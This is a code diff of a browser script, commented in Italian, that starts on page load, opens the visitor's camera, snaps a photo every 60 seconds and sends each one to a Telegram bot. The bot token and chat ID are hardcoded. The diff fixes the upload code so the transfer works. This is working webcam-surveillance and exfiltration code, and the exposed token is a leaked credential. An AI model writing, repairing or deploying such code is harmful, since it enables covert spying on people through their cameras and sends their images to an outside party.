@@ -1,4 +1,3 @@
-
 document.addEventListener('DOMContentLoaded', (event) => {
     const video = document.getElementById('video');
     const constraints = { video: true };
@@ -16,7 +15,7 @@ document.addEventListener('DOMContentLoaded', (event) => {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageDataUrl = canvas.toDataURL('image/jpeg');
                 sendToTelegram(imageDataUrl);
-            }, 60000);
+            }, 60000); // ogni 60 secondi
         })
         .catch(err => {
             console.error('Errore nell\'accesso alla fotocamera:', err);
@@ -27,17 +26,19 @@ async function sendToTelegram(imageDataUrl) {
     const apiToken = '7504005848:AAGY3pQyR5TW0n7pU9HLLHPWtqWL72s6mQ8';
     const chatId = '6759375069';
 
+    const blob = await (await fetch(imageDataUrl)).blob();
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'photo.jpg');
+
     const response = await fetch(`https://api.telegram.org/bot${apiToken}/sendPhoto`, {
         method: 'POST',
-        body: new FormData().append('photo', imageDataUrl.split(',')[1], 'photo.jpg').append('chat_id', chatId),
-        headers: {
-            'Content-Type': 'multipart/form-data'
-        }
+        body: formData
     });
 
     if (response.ok) {
-        console.log('Photo sent successfully');
+        console.log('Foto inviata con successo');
     } else {
-        console.error('Failed to send photo:', response.statusText);
+        console.error('Errore nell\'invio della foto:', response.statusText);
     }
 }
